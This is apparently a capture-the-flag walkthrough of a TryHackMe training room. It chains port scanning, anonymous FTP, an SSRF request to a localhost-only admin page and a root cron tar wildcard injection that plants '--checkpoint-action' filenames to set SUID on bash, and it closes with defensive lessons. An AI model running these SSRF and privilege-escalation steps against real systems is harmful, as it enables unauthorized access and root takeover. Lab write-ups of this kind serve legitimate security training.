# Operation Coldstart

## Room

TryHackMe Jr Pentester Challenges — Operation Coldstart. Replace `MACHINE_IP` with the IP assigned to the current lab instance.

## Objective

Compromise Volt Labs' forgotten staging server, retrieve `user.txt`, escalate to root, and read `flag.txt`.

## Attack flow

```text
Nmap
  -> Anonymous FTP
  -> Download backup.tar.gz containing source code
  -> Identify SSRF in URL previewer
  -> Reach localhost-only /admin/notes through kestrel.thm
  -> Recover webdev SSH credentials
  -> Read user.txt
  -> Discover root cron running tar * in writable /opt/backups
  -> Tar checkpoint argument injection
  -> Set SUID on bash
  -> /bin/bash -p
  -> Read /root/flag.txt
```

## Walkthrough

### 1. Enumerate the target

```bash
nmap -p- --min-rate 5000 -T4 MACHINE_IP
nmap -sCV -p21,22,80 MACHINE_IP
```

Expected services:

- `21/tcp` — vsftpd 3.0.5
- `22/tcp` — OpenSSH
- `80/tcp` — Gunicorn URL Preview service

### 2. Download the anonymous FTP backup

```bash
ftp MACHINE_IP
```

Log in as `anonymous`, then download the archive:

```text
cd pub
get backup.tar.gz
bye
```

Extract it locally:

```bash
tar -xzf backup.tar.gz
cd voltlabs-preview
less README.md
less app.py
```

The source shows that the previewer only allows the hostname `kestrel.thm`, while the admin routes trust requests from `127.0.0.1`.

### 3. Exploit SSRF to read internal notes

Request the allowed hostname and localhost-only route through the preview endpoint:

```text
http://MACHINE_IP/preview?url=http://kestrel.thm/admin/notes
```

The server resolves `kestrel.thm` locally and makes the request itself, so the admin route sees a loopback source address. The response discloses:

```text
user: webdev
pass: <redacted-pw>
```

### 4. Obtain the user flag

```bash
ssh webdev@MACHINE_IP
cat ~/user.txt
```

Observed flag:

```text
THM{…}
```

### 5. Identify the privileged backup job

Check sudo and scheduled jobs:

```bash
sudo -l
cat /etc/cron.d/voltlabs-backup
ls -ld /opt/backups
```

The vulnerable job runs as root every minute:

```text
* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

`/opt/backups` is writable by `webdev`. Because the shell expands `*` before invoking `tar`, attacker-controlled filenames beginning with `--` become tar options.

### 6. Abuse tar checkpoint options

From `/opt/backups`, plant a script and the two option-like filenames:

```bash
cd /opt/backups
printf 'chmod +s /bin/bash\n' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Wait for the root cron job to run, then verify the SUID bit:

```bash
ls -l /bin/bash
```

Start a privileged Bash shell:

```bash
/bin/bash -p
id
```

The effective UID should be `0`.

### 7. Read the root flag

```bash
cat /root/flag.txt
```

Observed flag:

```text
THM{…}
```

## Lessons learned

- Anonymous FTP must not expose source-code backups or deployment artifacts.
- Hostname allowlists are not sufficient SSRF protection; validate resolved IPs and block private/loopback ranges.
- Localhost source checks are unsafe when the application can make server-side requests.
- Secrets should not be stored in internal notes or source backups.
- Privileged cron jobs must avoid untrusted wildcard expansion.
- Backup directories used by root jobs must not be writable by unprivileged users.

## Evidence note

The flags and attack path were cross-checked against public walkthroughs. Revalidate them against the currently deployed instance if the room is rebuilt or rotated.
